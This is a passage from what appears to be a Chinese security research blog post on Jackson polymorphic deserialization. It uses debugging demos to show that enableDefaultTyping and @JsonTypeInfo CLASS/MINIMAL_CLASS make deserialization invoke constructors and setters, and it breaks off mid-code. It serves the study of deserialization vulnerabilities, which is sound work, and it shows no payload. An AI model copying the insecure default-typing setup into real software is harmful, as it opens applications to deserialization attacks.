<h5 id="3x05-JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#3x05-JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="3x05  JsonTypeInfo.Id.MINIMAL_CLASS"></a>3x05  JsonTypeInfo.Id.MINIMAL_CLASS</h5><p>修改注解值，然后测试 发现之前的其实单单只是缩短了 <code>@class</code>标识，效果还是 CLASS 差不多的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710492915804-412e426c-12f7-46c2-af0c-506ee34ee4ad.png#averageHue=%2340454f&clientId=u79bd535a-d81e-4&from=paste&height=130&id=u5ca8e7f1&originHeight=195&originWidth=1686&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=169434&status=done&style=none&taskId=uc9d427cd-4bfd-4ca8-9427-7f1bae9bce4&title=&width=1124" referrerpolicy="no-referrer" alt="image.png"></p>
<p>综上所述，jackson 注解中能够使得我们进行反序列化的值有如下两个：</p>
<ul>
<li>JsonTypeInfo.Id.CLASS  </li>
<li>JsonTypeInfo.Id.MINIMAL_CLASS</li>
</ul>
<h3 id="1x05-反序列化中类属性方法调用"><a href="#1x05-反序列化中类属性方法调用" class="headerlink" title="1x05 反序列化中类属性方法调用"></a>1x05 反序列化中类属性方法调用</h3><p>这里做个记录是为了给后续的反序列化流程调用做铺垫</p>
<h4 id="2x01-enableDefaultTyping"><a href="#2x01-enableDefaultTyping" class="headerlink" title="2x01 enableDefaultTyping"></a>2x01 enableDefaultTyping</h4><p>调试代码如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token keyword">int</span> age<span class="token punctuation">;</span>
    
    <span class="token keyword">public</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">,</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getMysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMysex</span><span class="token punctuation">(</span><span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>
                <span class="token string">", mysex="</span> <span class="token operator">+</span> mysex <span class="token operator">+</span>
                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Person</span> person<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            person<span class="token punctuation">.</span><span class="token function">setMysex</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">mysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            objectMapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
<span class="token comment">//            String json=objectMapper.writeValueAsString(person);</span>
<span class="token comment">//            System.out.println(json);</span>
            <span class="token class-name">Person</span> person1<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span><span class="token string">"&#123;\"name\":null,\"age\":0,\"mysex\":[\"mysex\",&#123;\"sex\":1&#125;]&#125;"</span><span class="token punctuation">,</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710567641743-242f4067-fffe-4b2a-a1dd-eb715d832037.png#averageHue=%2342454d&clientId=uf4eba0d9-e83c-4&from=paste&height=123&id=u6973636d&originHeight=185&originWidth=798&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=60421&status=done&style=none&taskId=u3f167579-878a-4d1e-8a63-aab84d51435&title=&width=532" referrerpolicy="no-referrer" alt="image.png"><br>第一次无参构造是因为我在给 person 中的 mysex 字段赋值时实例化操作了 mysex<br>那么可想而知的，后面 readValue 的操作就触发 mysex 的无参构造方法，先实例化了一个 mysex 的对象，然后调用 set 方法再去赋值<br>这是采用 objectmapper 的enableDefaultTyping 设置下做的测试，接下来尝试注解形式</p>
<h4 id="2x02-JsonTypeInfo-Id-CLASS"><a href="#2x02-JsonTypeInfo-Id-CLASS" class="headerlink" title="2x02 JsonTypeInfo.Id.CLASS"></a>2x02 JsonTypeInfo.Id.CLASS</h4><p>先注释掉测试代码中的<code>objectMapper.enableDefaultTyping();</code>操作，然后再给 person 类的指定字段属性值加上注解</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token keyword">int</span> age<span class="token punctuation">;</span>


    <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">MINIMAL_CLASS</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">,</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getMysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMysex</span><span class="token punctuation">(</span><span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>
                <span class="token string">", mysex="</span> <span class="token operator">+</span> mysex <span class="token operator">+</span>
                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们发现结果是一样的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710567897897-de9857c5-eb85-48a1-92be-200a14eb9470.png#averageHue=%2341434c&clientId=uf4eba0d9-e83c-4&from=paste&height=148&id=u239325d8&originHeight=222&originWidth=800&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=70047&status=done&style=none&taskId=u4d5876c8-5126-4b70-a645-cc0adfbf9a7&title=&width=533.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>也就是说在 JacksonPolymorphicDeserialization 的前提下，反序列化操作都是会调用里面类</p>
<p>如果这个时候我们再在 person 类中 set 方法和无参构造方法都加上 sout 标识</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token keyword">int</span> age<span class="token punctuation">;</span>


    <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">MINIMAL_CLASS</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">,</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了person的setname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了person的setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getMysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMysex</span><span class="token punctuation">(</span><span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了person的setMysex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用person的无参构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>
                <span class="token string">", mysex="</span> <span class="token operator">+</span> mysex <span class="token operator">+</span>
                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试类不变，发现其实只要是 jackson 对于反序列化的操作都会有这种特性：调用无参构造方法生成实例化对象，调用 set 方法赋值<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710568088198-2f4b025f-fe58-4b59-9f64-64a558323a0a.png#averageHue=%233d454e&clientId=uf4eba0d9-e83c-4&from=paste&height=322&id=u73512eca&originHeight=483&originWidth=781&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=154628&status=done&style=none&taskId=u9898787d-6cee-4c68-ba96-89c3b0e6cdc&title=&width=520.6666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
<h2 id="0x03-工作流程分析"><a href="#0x03-工作流程分析" class="headerlink" title="0x03 工作流程分析"></a>0x03 工作流程分析</h2><h3 id="1x00-环境搭建"><a href="#1x00-环境搭建" class="headerlink" title="1x00 环境搭建"></a>1x00 环境搭建</h3><p>下面是我本次工作流程调试的具体准备</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token keyword">int</span> age<span class="token punctuation">;</span>


    <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">MINIMAL_CLASS</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">,</span> <span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了person的setname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了person的setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getMysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMysex</span><span class="token punctuation">(</span><span class="token class-name">Object</span> mysex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了person的setMysex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mysex <span class="token operator">=</span> mysex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用person的无参构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>
                <span class="token string">", mysex="</span> <span class="token operator">+</span> mysex <span class="token operator">+</span>
                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Person</span> person<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
